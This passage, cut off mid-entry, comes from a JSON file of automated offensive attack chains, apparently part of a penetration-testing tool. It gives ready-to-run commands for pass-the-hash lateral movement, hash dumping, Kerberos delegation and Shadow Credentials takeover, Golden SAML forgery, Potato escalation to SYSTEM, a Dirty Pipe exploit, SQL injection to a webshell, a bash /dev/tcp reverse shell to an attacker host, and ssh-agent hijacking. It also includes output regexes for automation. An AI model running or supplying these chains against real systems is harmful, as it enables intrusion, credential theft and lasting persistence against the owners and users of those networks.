          "inline_command": "nxc smb <subnet> -u '<user>' -H '<hash>' -d '<domain>' --continue-on-success",
          "inputs": {
            "subnet": "${target_subnet}",
            "user": "${user}",
            "hash": "${hash}",
            "domain": "${domain}"
          },
          "capture": [
            {
              "var": "pwn3d_hosts",
              "regex": "^SMB\\s+(\\S+)\\s+\\d+\\s+\\S+\\s+\\[\\+\\][^\\n]*\\(Pwn3d!\\)",
              "match": "all"
            }
          ]
        },
        {
          "id": "sweep_winrm",
          "name": "Also try WinRM (some hosts only expose 5985)",
          "inline_command": "nxc winrm <subnet> -u '<user>' -H '<hash>' -d '<domain>'",
          "inputs": {
            "subnet": "${target_subnet}",
            "user": "${user}",
            "hash": "${hash}",
            "domain": "${domain}"
          }
        },
        {
          "id": "dump_hashes_on_pwn3d",
          "name": "secretsdump on a Pwn3d! host → snowball more creds",
          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<user>'@<pwn3d_host>",
          "requires": [
            "pwn3d_hosts"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "hash": "${hash}"
          },
          "notes": "One Pwn3d! → SAM/LSA dump → new NT hashes → re-run this chain with\neach new identity. Common Active Directory pivot pattern.\n",
          "capture": [
            {
              "var": "ntlm_hashes",
              "regex": "^([A-Za-z0-9._$-]+):(\\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
              "match": "all",
              "groups": {
                "user": 1,
                "rid": 2,
                "lm": 3,
                "nt": 4
              }
            }
          ]
        },
        {
          "id": "shell",
          "name": "Open an interactive shell on the Pwn3d! host",
          "inline_command": "evil-winrm -i <pwn3d_host> -u '<user>' -H '<hash>'",
          "requires": [
            "pwn3d_hosts"
          ],
          "inputs": {
            "user": "${user}",
            "hash": "${hash}"
          },
          "notes": "Prefer WinRM (5985) for an interactive PowerShell. Fall back to\n`impacket-psexec` / `wmiexec` / `atexec` with the same hash if WinRM\nisn't open.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Pass-the-Hash",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html"
        },
        {
          "title": "NetExec — SMB",
          "url": "https://www.netexec.wiki/smb-protocol"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "when": "Pwn3d! host found",
          "reason": "Loot DPAPI on every Pwn3d! host."
        },
        {
          "chain": "mssql-impersonation-chain",
          "when": "SQL service reachable",
          "reason": "Pivot to MSSQL with captured creds."
        },
        {
          "chain": "windows-priv-esc-recon",
          "when": "low-priv shell",
          "reason": "If you landed but aren't SYSTEM yet."
        }
      ]
    },
    {
      "id": "race-condition-toctou",
      "name": "Web / Linux — race condition / TOCTOU exploitation",
      "description": "Time-of-check / time-of-use bugs let you change a value between when the app validates it and when it acts on it. Two flavors: file-system TOCTOU (Linux privesc), and HTTP race-window (limit bypass, IDOR via parallel requests, double-spend).\n",
      "tags": [
        "race-condition",
        "toctou",
        "web",
        "linux",
        "priv-esc"
      ],
      "difficulty": "hard",
      "inputs": [],
      "steps": [
        {
          "id": "identify_target",
          "name": "Identify a TOCTOU candidate",
          "inline_command": "echo 'File-system TOCTOU triggers:\n  - SUID binary that stats a path → opens it (symlink swap window)\n  - cron job: chown/chmod-ing files in /tmp or any writable dir\n  - umask 0/000 + race to write into a privileged dir before chmod\n  - PHP file_get_contents on a path the app then chmod-s 600\n\nHTTP race triggers:\n  - Coupon code redemption (apply same code N times in parallel)\n  - Withdraw funds (initiate N withdrawals before balance update)\n  - Email verification (re-use the token N times before invalidation)\n  - User signup (claim a reserved username via concurrent POSTs)\n  - 2FA enrollment (race the disable-2FA endpoint with re-add)'\n"
        },
        {
          "id": "filesystem_toctou",
          "name": "File-system TOCTOU: symlink swap during SUID validation",
          "inline_command": "# Vulnerable SUID app at /usr/local/bin/vuln-app that:\n# 1) stats /tmp/in.txt — checks owned by current user\n# 2) opens it as root\n# → Race: between stat() and open(), swap a symlink.\n\ncat > /tmp/in.txt <<'EOF'\nlegitimate content\nEOF\n\n# Race loop:\nwhile true; do\n  ln -sf /tmp/in.txt /tmp/sym\ndone &\nLOOP1=$!\nwhile true; do\n  ln -sf /etc/shadow /tmp/sym\ndone &\nLOOP2=$!\n\n# In another shell:\nwhile true; do /usr/local/bin/vuln-app /tmp/sym; done\n\n# Kill the loops when you see /etc/shadow content:\nkill $LOOP1 $LOOP2\n"
        },
        {
          "id": "dirty_pipe_cve_2022_0847",
          "name": "Modern kernel TOCTOU — Dirty Pipe (CVE-2022-0847)",
          "inline_command": "# Linux 5.8 - 5.16 — write to any read-only file via pipe splice.\n# Used to overwrite /etc/passwd root entry with attacker hash.\ngit clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits /tmp/dp\ngcc /tmp/dp/exploit-1.c -o /tmp/dp/exploit-1\n/tmp/dp/exploit-1 /usr/bin/su  # replaces su's setuid bytes → root via patched su\n"
        },
        {
          "id": "http_race_with_turbo_intruder",
          "name": "HTTP race — Burp Turbo Intruder (single-packet attack)",
          "inline_command": "# In Burp → extension Turbo Intruder → load this script:\ncat > race.py <<'EOF'\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, engine=Engine.BURP2)\n    # Send 30 identical requests in a single HTTP/2 packet:\n    for i in range(30):\n        engine.queue(target.req)\ndef handleResponse(req, interesting):\n    table.add(req)\nEOF\n# Many \"limit once\" endpoints break under this single-packet attack:\n# all requests arrive within the same TCP segment, hit the DB before\n# the row-lock kicks in.\n"
        },
        {
          "id": "http_race_with_h2",
          "name": "HTTP/2 last-byte sync (most reliable race window)",
          "inline_command": "# James Kettle's technique: queue 30 requests, hold the LAST byte\n# of each, then release them all at once with one TLS write.\n# Tools: Turbo Intruder (Burp), or Frans Rosén's \"race-the-web\".\npython3 -c '\nfrom race_the_web import single_packet_attack\nsingle_packet_attack(\n    url=\"https://target.com/redeem\",\n    method=\"POST\",\n    body={\"code\": \"PROMO25\"},\n    headers={\"Cookie\": \"session=...\"},\n    concurrent=30,\n)'\n"
        },
        {
          "id": "account_takeover_via_race",
          "name": "Famous race takeover: re-use email-verify token",
          "inline_command": "# 1) Sign up with attacker@evil.com for username `admin`. Get verify token.\n# 2) Use the verify token N times in parallel — each request looks up\n#    the token, marks it used, sets your email. If the lookup happens\n#    before the prior update committed → you can race past `unique email`\n#    constraints and reuse the verify on a SECOND account claiming\n#    victim's email.\n# Tools: caido / Burp Turbo Intruder with the script above.\n"
        }
      ],
      "references": [
        {
          "title": "PortSwigger — Race conditions",
          "url": "https://portswigger.net/web-security/race-conditions"
        },
        {
          "title": "Single-packet attack (James Kettle)",
          "url": "https://portswigger.net/research/smashing-the-state-machine"
        },
        {
          "title": "Dirty Pipe (CVE-2022-0847)",
          "url": "https://dirtypipe.cm4all.com/"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "kernel race popped a root shell",
          "reason": "Stabilize the new root shell."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "gained root via TOCTOU",
          "reason": "Loot the box."
        }
      ]
    },
    {
      "id": "rbcd-takeover",
      "name": "AD — RBCD (Resource-Based Constrained Delegation) takeover",
      "description": "When you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer (or you own a computer account thanks to MachineAccountQuota>0), you can have your controlled machine S4U2self/S4U2proxy onto the target as anyone — including SYSTEM via the CIFS service.\n",
      "tags": [
        "rbcd",
        "delegation",
        "priv-esc",
        "kerberos",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        },
        {
          "name": "target_computer",
          "description": "Computer object you want to take over (e.g. SRV01$).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "maq_check",
          "name": "Check MachineAccountQuota (default = 10)",
          "command_ref": "nxc-ldap-maq",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "If MAQ > 0 any domain user can add their own computer object. That\nattacker-owned machine becomes the principal you delegate FROM.\n"
        },
        {
          "id": "add_attacker_computer",
          "name": "Create attacker-controlled computer account",
          "command_ref": "nxc-ldap-add-computer",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "The new computer account gets a random password; the tool prints it.\nNote the FQDN/SamAccountName for the next step.\n",
          "capture": [
            {
              "var": "attacker_computer",
              "regex": "Successfully added machine account ([A-Za-z0-9$]+) with password ([^\\s]+)",
              "match": "first",
              "groups": {
                "sam": 1,
                "password": 2
              }
            }
          ]
        },
        {
          "id": "write_rbcd",
          "name": "Write attacker-computer into target's msDS-AllowedToActOnBehalfOfOtherIdentity",
          "command_ref": "bloodyad-rbcd",
          "requires": [
            "attacker_computer"
          ],
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          }
        },
        {
          "id": "s4u2self",
          "name": "S4U2self+S4U2proxy to forge an admin ticket",
          "inline_command": "impacket-getST -spn 'cifs/<target>' -impersonate Administrator -dc-ip <dc-ip> '<domain>/<attacker_sam>:<attacker_password>'",
          "requires": [
            "attacker_computer"
          ],
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "target": "${target_computer}"
          },
          "notes": "The ticket lives at `Administrator@cifs_<target>.ccache`. Export\nKRB5CCNAME and you can secretsdump / psexec / smbexec as Administrator.\n"
        },
        {
          "id": "dump_secrets",
          "name": "secretsdump the target with the forged ticket",
          "inline_command": "export KRB5CCNAME=Administrator@cifs_<target>.ccache; impacket-secretsdump -k -no-pass <target>",
          "inputs": {
            "target": "${target_computer}"
          }
        }
      ],
      "references": [
        {
          "title": "RBCD — Elad Shamir",
          "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
        },
        {
          "title": "HackTricks — RBCD",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "when": "forged admin ticket",
          "reason": "Loot the target with the fresh admin ticket."
        },
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "target was DC",
          "reason": "Take a Golden Ticket out before cleanup."
        }
      ]
    },
    {
      "id": "saml-attacks",
      "name": "Web — SAML attacks (XSW signature wrapping, golden SAML)",
      "description": "SAML's XML-DSig signature is famously brittle. XSW lets you splice a forged assertion into a legitimately-signed envelope. With access to the IDP's signing key, Golden SAML mints arbitrary assertions = silent enterprise-wide AD FS / Okta / OneLogin takeover.\n",
      "tags": [
        "web",
        "saml",
        "sso",
        "xsw",
        "golden-saml",
        "account-takeover"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "target_sp",
          "description": "SAML SP endpoint (ACS / Assertion Consumer Service URL).",
          "required": true
        },
        {
          "name": "sample_saml_response",
          "description": "A valid SAMLResponse intercepted in transit (Burp / browser dev tools)."
        }
      ],
      "steps": [
        {
          "id": "decode_response",
          "name": "Decode the SAML Response",
          "inline_command": "# SAMLResponse is base64 + URL-encoded form field.\necho '<saml_response>' | python3 -c 'import sys, base64, urllib.parse; print(base64.b64decode(urllib.parse.unquote(sys.stdin.read())).decode())'\n",
          "inputs": {
            "saml_response": "${sample_saml_response}"
          },
          "notes": "Look at: <Subject>, <Conditions> (NotBefore/NotOnOrAfter), <Audience>,\n<AttributeStatement> (roles/groups). The Signature block tells you\nwhich element is signed — XSW exploits the fact that the SP might\nvalidate one element and process another.\n"
        },
        {
          "id": "xsw_with_samlraider",
          "name": "Auto-run XSW attacks with SAML Raider (Burp plugin)",
          "inline_command": "echo 'In Burp: select the SAMLResponse → SAML Raider tab → Attacks → run XSW1 through XSW8. Forward to SP, watch for an accepted forgery (different Subject, same signature).'",
          "notes": "8 canonical XSW variants. The SP's XML parser + signature validator\nmismatch is what each one targets — if your SP uses a popular library\n(Spring Security SAML, Shibboleth, etc.), at least one usually lands.\n"
        },
        {
          "id": "comment_injection_xsw",
          "name": "XSW via XML comment injection (Microsoft Active Login)",
          "inline_command": "# Trick: inject an XML comment inside the username attribute.\n# Signed canonical form sees \"admin@target.com<!--x-->\" as one string,\n# but the SP's XPath extraction stops at the comment → reads \"admin\".\nsed 's/<NameID>victim/<NameID>admin<!--/' original.xml | sed 's/victim<\\/NameID>/--><\\/NameID>/'\n",
          "notes": "Famous Duo / OneLogin / Shibboleth / Centrify bug from 2018. Worth\ntrying any time you control the username field of an existing assertion.\n"
        },
        {
          "id": "idp_initiated_replay",
          "name": "IDP-initiated replay (Conditions missing? Re-use assertions)",
          "inline_command": "# If NotOnOrAfter is unset or set far in the future + no replay-detection\n# (nonce check), the same SAMLResponse logs you in repeatedly.\ncurl -X POST '<sp>' -d \"SAMLResponse=<original_response_b64>&RelayState=/\"\n",
          "inputs": {
            "sp": "${target_sp}"
          }
        },
        {
          "id": "golden_saml",
          "name": "Golden SAML (post-compromise IDP key extraction)",
          "inline_command": "# 1) On the IDP server (ADFS): dump the token signing cert + private key.\nGet-AdfsCertificate\nmimikatz \"lsadump::trust /patch\"\n# 2) Generate arbitrary SAMLResponse signed by that key:\npython3 -c '\nfrom saml2 import config, server, response, saml, samlp\n# Build assertion as the desired user, sign with stolen key, post to SP.'\n",
          "notes": "Requires DA on the IDP server. Once you have the key, you can mint\nassertions for ANYONE indefinitely — survives password resets,\nMFA enrollment, even account deletion. The ultimate persistence\nagainst SSO-dependent infrastructure.\n"
        }
      ],
      "references": [
        {
          "title": "PortSwigger — SAML",
          "url": "https://portswigger.net/web-security/saml"
        },
        {
          "title": "Golden SAML (CyberArk)",
          "url": "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps"
        },
        {
          "title": "SAML Raider",
          "url": "https://github.com/CompassSecurity/SAMLRaider"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "Golden SAML succeeded — also have DA on the IDP host",
          "reason": "Layer Golden Ticket + Golden SAML for dual-domain + cloud persistence."
        }
      ]
    },
    {
      "id": "seimpersonate-potato",
      "name": "Windows PE — SeImpersonatePrivilege → SYSTEM (Potato family)",
      "description": "Service accounts (IIS, SQL, etc.) almost always carry SeImpersonatePrivilege. That single right plus the right helper binary == NT AUTHORITY\\\\SYSTEM. Different Windows versions need different \"potatoes\" — pick the right one.\n",
      "tags": [
        "windows",
        "priv-esc",
        "potato",
        "token-impersonation"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "confirm_priv",
          "name": "Confirm SeImpersonatePrivilege is enabled",
          "inline_command": "whoami /priv | findstr SeImpersonate",
          "notes": "Must show `Enabled`. If only `Disabled` — most service accounts can\nstill enable it via a tiny AdjustTokenPrivileges call (PowerSploit).\n"
        },
        {
          "id": "pick_potato",
          "name": "Pick the potato for the Windows version",
          "inline_command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n",
          "notes": "Server 2008 R2 / Win 7 / Server 2012:  JuicyPotato (BITS COM CLSID)\nServer 2016 / Win 10 1809+:           RoguePotato / PrintSpoofer\nServer 2019 / Server 2022 / Win 11:   GodPotato (RPC over SMB)\nThe patched-DCOM list breaks JuicyPotato on newer versions — start\nwith PrintSpoofer/GodPotato when in doubt.\n"
        },
        {
          "id": "printspoofer",
          "name": "PrintSpoofer (most modern Windows)",
          "inline_command": "PrintSpoofer.exe -i -c cmd",
          "notes": "Needs SeImpersonatePrivilege + RPC printer spooler reachable. Drops\nyou into a SYSTEM shell. Use `-c \\\"<command>\\\"` to fire-and-forget.\n"
        },
        {
          "id": "godpotato",
          "name": "GodPotato (Windows 2022 / 11)",
          "inline_command": "GodPotato.exe -cmd \"cmd /c whoami > C:\\Users\\Public\\who.txt\"",
          "notes": "GodPotato survives the patches that killed JuicyPotato. Same idea —\nimpersonate the SYSTEM token via the RpcCss service.\n"
        },
        {
          "id": "juicypotato_legacy",
          "name": "JuicyPotato (legacy Windows ≤ 2016)",
          "inline_command": "JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe -l 9999 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\"",
          "notes": "The CLSID list at https://github.com/ohpe/juicy-potato/tree/master/CLSID\ngroups working CLSIDs per OS build. Use a CLSID flagged for SYSTEM.\n"
        },
        {
          "id": "confirm_system",
          "name": "Confirm SYSTEM",
          "inline_command": "whoami",
          "notes": "Expected: `nt authority\\\\system`. From here: secretsdump locally,\nmimikatz, drop a persistence service / scheduled task.\n"
        }
      ],
      "references": [
        {
          "title": "Potato family — itm4n",
          "url": "https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/"
        },
        {
          "title": "GodPotato",
          "url": "https://github.com/BeichenDream/GodPotato"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "reason": "SYSTEM → secretsdump locally, pull every user's DPAPI."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "NTLM hashes captured locally",
          "reason": "New identities → lateral movement."
        }
      ]
    },
    {
      "id": "shadow-credentials",
      "name": "AD — Shadow Credentials (msDS-KeyCredentialLink)",
      "description": "When you have write access to a target principal (GenericWrite/AllExtendedRights on a user or computer), Shadow Credentials lets you add a key credential and PKINIT as that principal. Cleaner than a password reset — leaves the existing password intact and avoids audit noise.\n",
      "tags": [
        "shadow-credentials",
        "key-credential",
        "dacl-abuse",
        "priv-esc",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "description": "Principal you control (has write rights on target).",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        },
        {
          "name": "target_principal",
          "description": "User/computer whose key credentials you write.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "bloodhound_path",
          "name": "Confirm the write-access path via BloodHound",
          "inline_command": "echo 'In BloodHound, query: MATCH (n {name:\"<USER>\"}), (m {name:\"<TARGET>\"}), p=shortestPath((n)-[*]->(m)) RETURN p'",
          "notes": "Look for GenericWrite, GenericAll, WriteOwner, AllExtendedRights, or\nAddKeyCredentialLink directly. Anything that lets you write\nmsDS-KeyCredentialLink works.\n"
        },
        {
          "id": "write_keycred",
          "name": "Add a KeyCredentialLink to the target",
          "command_ref": "certipy-shadow",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "target_user": "${target_principal}"
          },
          "notes": "certipy writes the cert into msDS-KeyCredentialLink, prints a PFX\nand a one-shot ccache. Stash the PFX path for the next step.\n",
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            },
            {
              "var": "target_nt_hash",
              "regex": "Got hash for '\\S+':[^a-f0-9]*([a-f0-9]{32}):([a-f0-9]{32})",
              "match": "first",
              "groups": {
                "lm": 1,
                "nt": 2
              }
            }
          ]
        },
        {
          "id": "confirm_hash",
          "name": "Confirm the recovered NT hash",
          "inline_command": "echo 'Captured NT hash for <target>. Use it directly with secretsdump / evil-winrm / nxc --H.'",
          "requires": [
            "target_nt_hash"
          ]
        },
        {
          "id": "cleanup",
          "name": "Clean up the planted key (recommended)",
          "inline_command": "certipy shadow clear -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target>'",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "target": "${target_principal}"
          },
          "notes": "Removes the KeyCredential entry you wrote. Polite for blue-team labs\nand stops anyone else from reusing your foothold.\n"
        }
      ],
      "references": [
        {
          "title": "Shadow Credentials — SpecterOps",
          "url": "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec"
        },
        {
          "title": "Certipy shadow command",
          "url": "https://github.com/ly4k/Certipy#shadow"
        }
      ],
      "next_chains": [
        {
          "chain": "pth-lateral-spread",
          "when": "target_nt_hash captured",
          "reason": "New identity → spread laterally."
        },
        {
          "chain": "dpapi-secrets-extraction",
          "when": "target was local admin",
          "reason": "Loot DPAPI as the new identity."
        },
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "target was DA / DC",
          "reason": "Persistence before cleanup."
        }
      ]
    },
    {
      "id": "shell-stabilization",
      "name": "Post-Ex — stabilize a noisy reverse shell",
      "description": "You popped a netcat reverse shell. CTRL+C kills it; tab-completion is dead; vim is mangled. Apply the canonical 4-step upgrade to get a real TTY. Memorize it — you'll do this 200 times.\n",
      "tags": [
        "post-exploitation",
        "shell-upgrade",
        "tty",
        "linux"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "lport",
          "description": "Port your nc listener is on.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "spawn_pty",
          "name": "Step 1 — Upgrade to a PTY (python/script/expect)",
          "inline_command": "# In the shell (try in order):\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# or:\npython  -c 'import pty; pty.spawn(\"/bin/bash\")'\n# or:\nscript -qc /bin/bash /dev/null\n# or BSD-style:\n/usr/bin/script -qc /bin/bash /dev/null\n"
        },
        {
          "id": "set_term",
          "name": "Step 2 — Set TERM + size",
          "inline_command": "export TERM=xterm-256color; export SHELL=/bin/bash"
        },
        {
          "id": "background",
          "name": "Step 3 — Background the shell (CTRL+Z), tweak local terminal",
          "inline_command": "# Press CTRL+Z to suspend, then on your local term:\nstty raw -echo; fg\n# (the prompt disappears — that's expected — hit Enter)\nreset"
        },
        {
          "id": "size_terminal",
          "name": "Step 4 — Match terminal rows/cols",
          "inline_command": "# On your local term first, get values:\nstty size\n# Then back in the shell:\nstty rows <ROWS> cols <COLS>\n"
        },
        {
          "id": "confirm",
          "name": "Confirm: arrow keys, vim, CTRL+C all work",
          "inline_command": "vim /tmp/x  # if it opens cleanly + you can :q out, you're good"
        },
        {
          "id": "alternative_socat",
          "name": "Alternative: open a fresh socat full-TTY shell",
          "inline_command": "# Attacker (listen):\nsocat file:`tty`,raw,echo=0 tcp-listen:<lport>\n# Victim:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<lhost>:<lport>\n",
          "inputs": {
            "lport": "${lport}"
          },
          "notes": "No upgrade needed — socat gives you a full-fidelity shell from the\nstart. Both ends need socat installed.\n"
        }
      ],
      "references": [
        {
          "title": "Ropnop — TTY upgrade reference",
          "url": "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"
        },
        {
          "title": "HackTricks — Shells (Linux)",
          "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/linux.html"
        }
      ],
      "next_chains": [
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell is on Linux",
          "reason": "You're stable — start enumeration."
        },
        {
          "chain": "windows-priv-esc-recon",
          "when": "shell is on Windows",
          "reason": "You're stable — start enumeration."
        }
      ]
    },
    {
      "id": "smb-null-session-enum",
      "name": "Recon — SMB null/guest session enumeration",
      "description": "Anonymous/guest SMB enumeration to harvest users, shares, and password policy without any credentials. Classic OSCP/HTB starting point when ports 139/445 are open and signing isn't strictly enforced.\n",
      "tags": [
        "recon",
        "smb",
        "null-session",
        "enumeration"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "shares",
          "name": "List shares with null session",
          "command_ref": "nxc-smb-shares",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Look for shares with READ/WRITE that aren't SYSVOL/NETLOGON/IPC$/Print$.\nA writable share = potential web-shell drop / phishing bait / DLL planting.\n"
        },
        {
          "id": "users",
          "name": "Enumerate users",
          "command_ref": "nxc-smb-users",
          "inputs": {
            "ip": "${target_ip}"
          },
          "capture": [
            {
              "var": "user_list",
              "regex": "^[A-Z]+\\s+\\S+\\s+\\d+\\s+\\S+\\\\([A-Za-z0-9._-]+)",
              "match": "all"
            }
          ]
        },
        {
          "id": "groups",
          "name": "Enumerate groups",
          "command_ref": "nxc-smb-groups",
          "inputs": {
            "ip": "${target_ip}"
          }
        },
        {
          "id": "password_policy",
          "name": "Check password policy",
          "inline_command": "nxc smb <ip> -u '' -p '' --pass-pol",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Knowing the lockout threshold is critical before spraying. <5 = risky.\n"
        },
        {
          "id": "spider_readable",
          "name": "Spider any readable share for secrets",
          "command_ref": "nxc-smb-spider",
          "requires": [],
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "Grep results for `password`, `pwd`, `cred`, web.config, unattend.xml,\nGroups.xml (cpassword), and SSH/RDP key files.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Pentesting SMB",
          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html"
        },
        {
          "title": "NetExec SMB module",
          "url": "https://www.netexec.wiki/smb-protocol"
        }
      ],
      "next_chains": [
        {
          "chain": "password-spray",
          "when": "user_list captured",
          "reason": "You have users — spray a small candidate set."
        },
        {
          "chain": "ldap-anonymous-enum",
          "reason": "Pair SMB enum with LDAP enum for the full AD picture."
        },
        {
          "chain": "gpp-cpassword-recovery",
          "when": "any valid credential",
          "reason": "Authenticated SMB → grep SYSVOL for GPP."
        }
      ]
    },
    {
      "id": "sqli-to-os-shell",
      "name": "Web → Shell — SQL injection → OS shell",
      "description": "Confirm SQLi, fingerprint the DBMS, dump credentials, and pivot to OS command execution via the DB engine's native facility (xp_cmdshell on MSSQL, sys_exec on MySQL UDF, COPY FROM PROGRAM on Postgres). sqlmap handles 80% of the heavy lifting.\n",
      "tags": [
        "web",
        "sqli",
        "sqlmap",
        "rce"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "Vulnerable URL with injectable parameter.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_sqli",
          "name": "Confirm SQLi with sqlmap",
          "inline_command": "sqlmap -u '<url>' --batch --random-agent --level=2 --risk=2",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "For POST/JSON/multipart: use `-r request.txt` (save the request from\nBurp). Add `--cookie=` for authenticated injections.\n"
        },
        {
          "id": "enumerate",
          "name": "Dump dbs / tables / users / current-user",
          "inline_command": "sqlmap -u '<url>' --batch --dbs --is-dba --current-user --hostname",
          "inputs": {
            "url": "${target_url}"
          },
          "capture": [
            {
              "var": "db_user",
              "regex": "current user:\\s+([^\\s\\n]+)",
              "match": "first"
            },
            {
              "var": "dbs",
              "regex": "available databases \\[\\d+\\]:[\\s\\S]*?(?=back-end|\\Z)",
              "match": "first"
            }
          ]
        },
        {
          "id": "dump_creds",
          "name": "Dump users/password tables for credential reuse",
          "inline_command": "sqlmap -u '<url>' --batch -D <db> -T users --dump",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Common table names: users, accounts, members, admins. Dumped hashes\n→ hashcat / John. Reuse cracked passwords on SSH, RDP, the admin\npanel, AD if domain-joined.\n"
        },
        {
          "id": "os_shell_branch",
          "branch": [
            {
              "when": "db_user",
              "label": "MSSQL → xp_cmdshell via sqlmap",
              "inline_command": "sqlmap -u '<url>' --batch --os-shell"
            },
            {
              "when": "db_user",
              "label": "MySQL → INTO OUTFILE webshell",
              "inline_command": "sqlmap -u '<url>' --batch --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php"
            },
            {
              "when": "db_user",
              "label": "PostgreSQL → COPY FROM PROGRAM",
              "inline_command": "sqlmap -u '<url>' --batch --os-cmd='id'"
            }
          ]
        },
        {
          "id": "upgrade_shell",
          "name": "Move to a real reverse shell",
          "inline_command": "# In the os-shell or via the webshell:\n# bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        }
      ],
      "references": [
        {
          "title": "HackTricks — SQLi",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html"
        },
        {
          "title": "sqlmap usage",
          "url": "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "reverse shell received",
          "reason": "Stabilize."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell on Linux DB host",
          "reason": "DB user is usually low-priv."
        },
        {
          "chain": "windows-priv-esc-recon",
          "when": "shell on Windows MSSQL host",
          "reason": "NT SERVICE\\MSSQLSERVER often has SeImpersonate."
        }
      ]
    },
    {
      "id": "ssh-agent-forwarding-abuse",
      "name": "Lateral — SSH agent forwarding abuse (hijack the socket)",
      "description": "A logged-in admin used `ssh -A` to reach your compromised box → their agent socket is in /tmp. Reuse it to authenticate as them to any other host their keys reach. No password, no key file, full transparency.\n",
      "tags": [
        "lateral-movement",
        "ssh",
        "agent-forwarding",
        "post-exploitation",
        "linux"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "find_agent_sockets",
          "name": "Find every accessible ssh-agent socket",
          "inline_command": "ls -la /tmp/ssh-* 2>/dev/null\nls -la /tmp/.ssh-* 2>/dev/null\n# Sometimes in user home / runtime dir:\nfind /tmp /run /var/run -name 'agent.*' -o -name 'ssh-agent.*' 2>/dev/null\n# Per-process via /proc:\nfor pid in $(pgrep -f 'ssh.*-A'); do\n  cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep SSH_AUTH_SOCK\ndone\n",
          "capture": [
            {
              "var": "agent_sockets",
